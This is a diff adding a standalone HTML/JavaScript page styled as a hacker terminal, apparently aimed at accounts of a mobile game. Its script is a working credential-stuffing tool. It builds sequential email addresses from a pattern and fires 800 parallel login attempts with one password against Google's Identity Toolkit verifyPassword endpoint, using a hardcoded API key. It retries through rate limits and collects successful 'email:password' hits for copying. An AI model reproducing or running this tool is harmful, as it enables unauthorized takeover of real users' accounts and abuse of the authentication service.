@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CPM2 ACCURACY V20</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
+        .terminal { max-width: 550px; margin: auto; border: 2px solid #0f0; background: #050505; padding: 15px; border-radius: 12px; box-shadow: 0 0 35px #0f0; }
+        h1 { font-size: 18px; color: #fff; border-bottom: 2px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; }
+        
+        .input-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
+        .range-row { display: flex; gap: 10px; }
+        input { flex: 1; padding: 14px; background: #111; border: 1px solid #0f0; color: #fff; border-radius: 5px; outline: none; text-align: center; font-size: 14px; }
+        
+        .btn-start { width: 100%; padding: 18px; background: #0f0; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 8px; margin-bottom: 10px; }
+        .btn-copy { width: 100%; padding: 12px; background: #222; color: #0f0; border: 1px solid #0f0; cursor: pointer; border-radius: 5px; font-weight: bold; margin-bottom: 10px; }
+
+        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        .stat-card { background: #0a0a0a; border: 1px solid #333; padding: 12px; border-radius: 8px; }
+        .stat-card b { font-size: 24px; color: #0f0; display: block; }
+        
+        #status { color: #0ff; font-weight: bold; margin-bottom: 10px; font-size: 13px; min-height: 15px; }
+        #results { width: 100%; height: 320px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; font-size: 12px; margin-top: 10px; resize: none; border-radius: 8px; }
+    </style>
+</head>
+<body>
+
+<div class="terminal">
+    <h1>🚀 CPM2 ACCURACY V20</h1>
+    <div id="status">READY TO SCAN</div>
+
+    <div class="input-group">
+        <div class="range-row">
+            <input type="number" id="minNum" placeholder="MIN (Start)">
+            <input type="number" id="maxNum" placeholder="MAX (End)">
+        </div>
+        <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
+        <input type="text" id="pass" placeholder="PASSWORD">
+    </div>
+    
+    <button class="btn-start" id="mainBtn" onclick="ignite()">⚡ START SCAN</button>
+    <button class="btn-copy" onclick="copyAll()">📋 COPY ALL HITS</button>
+
+    <div class="stats">
+        <div class="stat-card">CHECKED<b id="cVal">0</b></div>
+        <div class="stat-card">HITS<b id="fVal">0</b></div>
+    </div>
+
+    <textarea id="results" readonly placeholder="Hits Order: 1, 2, 3... (No Skips)"></textarea>
+</div>
+
+<script>
+    let active = false, checked = 0, found = 0, current, limit, nextSync = 0;
+    let storage = new Map(), uiBuffer = "", startTime;
+    const apiKey = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
+
+    async function ignite() {
+        if (active) { location.reload(); return; }
+        let s = parseInt(document.getElementById('minNum').value);
+        let e = parseInt(document.getElementById('maxNum').value);
+        let f = document.getElementById('fmt').value.toUpperCase().trim();
+        let p = document.getElementById('pass').value.trim();
+
+        if (isNaN(s) || isNaN(e) || !f.includes('{')) return alert("Inputs ശരിയല്ല!");
+
+        active = true; current = s; nextSync = s; limit = e; startTime = Date.now();
+        document.getElementById('mainBtn').innerText = "🛑 STOP ENGINE";
+        document.getElementById('mainBtn').style.background = "#f00";
+        
+        let digits = f.match(/\{(\d+)\}/)[1];
+
+        // Optimized Thread Count for Stability
+        for (let i = 0; i < 800; i++) {
+            (async function worker() {
+                while (active && current <= limit) {
+                    let n = current++;
+                    await check(f, p, n, digits);
+                }
+            })();
+        }
+
+        setInterval(() => {
+            if (!active) return;
+            let spd = Math.round(checked / ((Date.now() - startTime) / 1000));
+            document.getElementById('status').innerText = `🔥 SPEED: ${spd} REQ/S | SYNCING: ${nextSync}`;
+            document.getElementById('cVal').innerText = checked;
+            document.getElementById('fVal').innerText = found;
+            if (uiBuffer !== "") {
+                let box = document.getElementById('results');
+                box.value += uiBuffer;
+                box.scrollTop = box.scrollHeight;
+                uiBuffer = "";
+            }
+        }, 500);
+    }
+
+    async function check(f, p, n, d) {
+        let email = f.replace(/\{(\d+)\}/, n.toString().padStart(d, '0'));
+        try {
+            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${apiKey}`, {
+                method: 'POST',
+                body: JSON.stringify({ email, password: p, returnSecureToken: true }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+            
+            if (r.status === 429) {
+                document.getElementById('status').innerText = "⚠️ COOLING DOWN IP...";
+                await new Promise(res => setTimeout(res, 6000));
+                return check(f, p, n, d);
+            }
+
+            let resJson = await r.json();
+            storage.set(n, { hit: (resJson && resJson.idToken), mail: email });
+
+            // STRICT SEQUENCE LOCK: 1-2-3-4-5...
+            while (storage.has(nextSync)) {
+                let item = storage.get(nextSync);
+                if (item.hit) { found++; uiBuffer += item.mail + ":" + p + "\n"; }
+                checked++;
+                storage.delete(nextSync);
+                nextSync++;
+            }
+        } catch (e) { return check(f, p, n, d); }
+    }
+
+    function copyAll() {
+        let area = document.getElementById('results');
+        area.select();
+        document.execCommand('copy');
+        alert("Copied! 🔥");
+    }
+</script>
+</body>
+</html>
